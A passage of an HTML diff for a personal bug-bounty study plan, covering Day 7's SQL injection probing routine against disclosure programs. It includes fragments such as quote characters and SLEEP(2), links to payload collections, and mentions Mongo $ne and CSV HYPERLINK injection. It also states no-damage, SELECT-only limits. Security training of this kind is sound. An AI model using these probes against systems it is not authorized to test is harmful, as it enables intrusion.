+<li><input type="checkbox" id="w06d6c0"><label for="w06d6c0"><b>0:00–0:15</b> — 3 preconditions</label></li>
+<li><input type="checkbox" id="w06d6c1"><label for="w06d6c1"><b>0:15–1:05</b> — read proof + blocked check (lab)</label></li>
+<li><input type="checkbox" id="w06d6c2"><label for="w06d6c2"><b>1:05–2:00</b> — 2 pivot diagrams</label></li>
+<li><input type="checkbox" id="w06d6c3"><label for="w06d6c3"><b>2:00–2:35</b> — map + vectors + 24h rule</label></li>
+<li><input type="checkbox" id="w06d6c4"><label for="w06d6c4"><b>2:35–3:00</b> — stop rule + gaps</label></li>
+<li><input type="checkbox" id="w06d6c5"><label for="w06d6c5"><b>Proof</b> — map + lab proof archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Prove read, claim RCE path, stop.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('6')">📋 Copy day</button><button class="btn" onclick="openDayLinks('6')">🔗 Open links</button><button class="btn" onclick="resetDay('6')">↺ Reset</button></div>
+</div></div>
+
+<div class="day" id="day-7" data-day="7">
+<button class="day-head" onclick="toggleDay('day-7')"><span>Day 7 — Live injection sweep (safe, baselined)</span><span class="dpill dpct">0%</span><span class="chev">▾</span></button>
+<div class="dbar"><i></i></div>
+<div class="day-body" id="body-7">
+<div class="timer">Real 180 min · reproduce twice or kill, no damage</div>
+<ol class="timeline">
+<li class="t"><p class="t-head"><span class="t-time">0:00–0:15</span> Probe order: error → boolean → time → OOB</p>
+<p class="t-act">Write order + safe payload per stage (<code>' " \</code> → boolean → <code>SLEEP(2)</code> once → OOB). Check <b>WSTG SQLi confirm-loop headings ONLY</b>.</p>
+<div class="t-links"><a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" target="_blank" rel="noopener">WSTG: confirm loop</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Order + safe payloads cold.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">0:15–1:05</span> Params/JSON/XML probes with baselines on VDP (safe only)</p>
+<p class="t-act">Probe login/search/sort/filter (params + JSON types + XML) with <b>control baseline each + 500/stack-trace capture</b>. <b>No sqlmap on live, no time-flood, no second-order trigger on others.</b></p>
+<div class="t-links"><a href="https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" target="_blank" rel="noopener">WSTG: input validation index</a><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: safe probes</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>X</h4><p>Search <code>blind SQLi dump HackerOne</code> only if error/500 signals — else log + move.</p><h4>Done-when</h4><p>Probes + baselines + 500 log.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">1:05–2:00</span> Same-program SQLi disclosures (2)</p>
+<p class="t-act">Read <b>H1 hacktivity same-program SQLi 2 — vulnerable param + DBMS ONLY</b>. Compare your param coverage.</p>
+<div class="t-links"><a href="https://hackerone.com/hacktivity" target="_blank" rel="noopener">H1: same-program SQLi</a><a href="https://github.com/ajaysenr/HackerOne-Disclosed-Reports" target="_blank" rel="noopener">H1: mirror</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>2 param patterns + coverage gap.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:00–2:35</span> 500-log + OOB-log + playbook update (safe)</p>
+<p class="t-act">Log 500s + stack traces as candidates. Update playbook (error→blind→OOB order + DBMS notes). <b>Backup-state awareness: no state change confirmed.</b></p>
+<div class="t-links"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener">PATT: playbook rows</a><a href="https://github.com/hanzalaghayasabbasi/portswigger-all-labs" target="_blank" rel="noopener">Community: all-labs solutions (attempt first)</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Logs + playbook saved.</p></details></li>
+<li class="t"><p class="t-head"><span class="t-time">2:35–3:00</span> Confirm-loop + no-damage test + gaps to Week 07</p>
+<p class="t-act">Recite loop + damage rules. Assign gaps (template/parser stacks) to Week 07.</p>
+<div class="t-links"><a href="https://github.com/su6osec/Bug-Bounty-Hunting-Methodology-2026" target="_blank" rel="noopener">HuntBook: confirm loop</a></div>
+<details class="why"><summary>Why this matters ▼</summary><h4>Done-when</h4><p>Recited + logs archived + assignments.</p></details></li>
+</ol>
+<ul class="chk">
+<li><input type="checkbox" id="w06d7c0"><label for="w06d7c0"><b>0:00–0:15</b> — probe order + safe payloads</label></li>
+<li><input type="checkbox" id="w06d7c1"><label for="w06d7c1"><b>0:15–1:05</b> — VDP probes + baselines + 500 log</label></li>
+<li><input type="checkbox" id="w06d7c2"><label for="w06d7c2"><b>1:05–2:00</b> — 2 same-program patterns</label></li>
+<li><input type="checkbox" id="w06d7c3"><label for="w06d7c3"><b>2:00–2:35</b> — OOB log + playbook (no damage)</label></li>
+<li><input type="checkbox" id="w06d7c4"><label for="w06d7c4"><b>2:35–3:00</b> — loop + rules + gaps to W07</label></li>
+<li><input type="checkbox" id="w06d7c5"><label for="w06d7c5"><b>Proof</b> — logs + playbook archived</label></li>
+</ul>
+<div class="mind"><b>Hunter mindset:</b> Minimal proof (count + 1 row), then stop.</div>
+<div class="day-actions"><button class="btn" onclick="copyDay('7')">📋 Copy day</button><button class="btn" onclick="openDayLinks('7')">🔗 Open links</button><button class="btn" onclick="resetDay('7')">↺ Reset</button></div>
+</div></div>
+
+<footer style="color:var(--text-soft);margin-top:1.5rem;font-size:.83rem">SELECT-only on live. No DROP/DELETE/UPDATE, no time-flood, no prod webshell. Surprise: Mongo <code>$ne</code> + CSV <code>=HYPERLINK</code> are Week 10 logic fuel — keep those notes open.</footer>
+</div></main>
+<footer class="site-footer"><div class="inner"><div class="left"><span class="mark">&gt;</span> sayed_ · bug hunter plan</div><div class="links"><a href="/index.html">Posts</a><a href="/about.html">About</a><a href="/keendork/keendork.html">Dorks</a><a href="/bugbounty-plan/index.html">Plan</a><a href="mailto:s4youud@gmail.com">Email</a></div></div></footer>
+<script src="js/plan.js"></script>
+</body>
+</html>
